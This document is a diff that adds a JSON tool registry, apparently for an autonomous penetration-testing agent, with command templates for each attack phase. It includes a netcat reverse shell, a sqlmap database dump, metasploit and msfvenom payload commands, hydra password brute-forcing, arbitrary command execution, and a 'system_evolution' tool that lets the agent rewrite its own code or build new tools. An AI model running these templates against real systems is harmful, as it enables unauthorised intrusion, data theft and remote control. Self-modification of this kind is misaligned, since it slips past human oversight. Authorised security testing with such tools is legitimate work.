@@ -1,0 +1,169 @@
+{
+    "nmap_port_scan": {
+        "name": "nmap_port_scan",
+        "category": "RECON",
+        "command_template": "nmap -p- -T4 {target}",
+        "phase_allowed": [
+            "INIT",
+            "RECON"
+        ],
+        "risk_level": "low"
+    },
+    "nmap_service_scan": {
+        "name": "nmap_service_scan",
+        "category": "RECON",
+        "command_template": "nmap -sV -p{ports} {target}",
+        "phase_allowed": [
+            "RECON"
+        ],
+        "risk_level": "low"
+    },
+    "passive_recon": {
+        "name": "passive_recon",
+        "category": "RECON",
+        "command_template": "",
+        "phase_allowed": [
+            "INIT",
+            "RECON"
+        ],
+        "risk_level": "low",
+        "system_tool": false
+    },
+    "nmap_vuln_scan": {
+        "name": "nmap_vuln_scan",
+        "category": "VULN_SCAN",
+        "command_template": "nmap --script vuln -p{port} {target}",
+        "phase_allowed": [
+            "VULN_SCAN"
+        ],
+        "risk_level": "medium"
+    },
+    "nikto_web_scan": {
+        "name": "nikto_web_scan",
+        "category": "VULN_SCAN",
+        "command_template": "nikto -h {target} -p {port}",
+        "phase_allowed": [
+            "VULN_SCAN"
+        ],
+        "risk_level": "medium"
+    },
+    "sqlmap_scan": {
+        "name": "sqlmap_scan",
+        "category": "VULN_SCAN",
+        "command_template": "sqlmap -u {target} --batch --level=1",
+        "phase_allowed": [
+            "VULN_SCAN"
+        ],
+        "risk_level": "medium"
+    },
+    "sqlmap_exploit": {
+        "name": "sqlmap_exploit",
+        "category": "EXPLOIT",
+        "command_template": "sqlmap -u {target} --batch --dump",
+        "phase_allowed": [
+            "EXPLOIT"
+        ],
+        "risk_level": "high"
+    },
+    "metasploit_exploit": {
+        "name": "metasploit_exploit",
+        "category": "EXPLOIT",
+        "command_template": "msfconsole -q -x 'use {exploit}; set RHOSTS {target}; exploit'",
+        "phase_allowed": [
+            "EXPLOIT"
+        ],
+        "risk_level": "high"
+    },
+    "msfvenom_payload": {
+        "name": "msfvenom_payload",
+        "category": "PAYLOAD",
+        "command_template": "msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f {format}",
+        "phase_allowed": [
+            "EXPLOIT",
+            "FOOTHOLD"
+        ],
+        "requires_foothold": false,
+        "risk_level": "high"
+    },
+    "reverse_shell": {
+        "name": "reverse_shell",
+        "category": "PAYLOAD",
+        "command_template": "nc -e /bin/bash {lhost} {lport}",
+        "phase_allowed": [
+            "EXPLOIT",
+            "FOOTHOLD"
+        ],
+        "requires_foothold": false,
+        "risk_level": "critical"
+    },
+    "privilege_escalation": {
+        "name": "privilege_escalation",
+        "category": "POST_EXPLOIT",
+        "command_template": "sudo -l",
+        "phase_allowed": [
+            "POST_EXPLOIT"
+        ],
+        "requires_foothold": true,
+        "risk_level": "high"
+    },
+    "lateral_movement": {
+        "name": "lateral_movement",
+        "category": "POST_EXPLOIT",
+        "command_template": "ssh {target}",
+        "phase_allowed": [
+            "POST_EXPLOIT"
+        ],
+        "requires_foothold": true,
+        "risk_level": "critical"
+    },
+    "generic_command": {
+        "name": "generic_command",
+        "category": "EXPLOIT",
+        "command_template": "{command}",
+        "phase_allowed": [
+            "EXPLOIT",
+            "POST_EXPLOIT"
+        ],
+        "risk_level": "critical",
+        "max_failures": 1
+    },
+    "package_install": {
+        "name": "package_install",
+        "category": "INIT",
+        "command_template": "sudo apt-get install -y {package}",
+        "phase_allowed": [
+            "INIT",
+            "RECON",
+            "VULN_SCAN",
+            "EXPLOIT",
+            "POST_EXPLOIT"
+        ],
+        "risk_level": "medium",
+        "description": "Install missing tools via apt-get. Requires sudo permissions."
+    },
+    "hydra_bruteforce": {
+        "name": "hydra_bruteforce",
+        "category": "EXPLOIT",
+        "command_template": "hydra -l {user} -P {passlist} {target} {service}",
+        "phase_allowed": [
+            "EXPLOIT"
+        ],
+        "risk_level": "high",
+        "description": "Password cracking tool for various services (ssh, ftp, rdp, etc.)"
+    },
+    "system_evolution": {
+        "name": "system_evolution",
+        "category": "EXPLOIT",
+        "command_template": "INTERNAL: {action} {target}",
+        "phase_allowed": [
+            "INIT",
+            "RECON",
+            "VULN_SCAN",
+            "EXPLOIT",
+            "POST_EXPLOIT"
+        ],
+        "risk_level": "critical",
+        "priority": 100,
+        "description": "Modify system code or create new tools. Args: action='create_tool'|'modify_file', target='name/path', instruction='...'"
+    }
+}
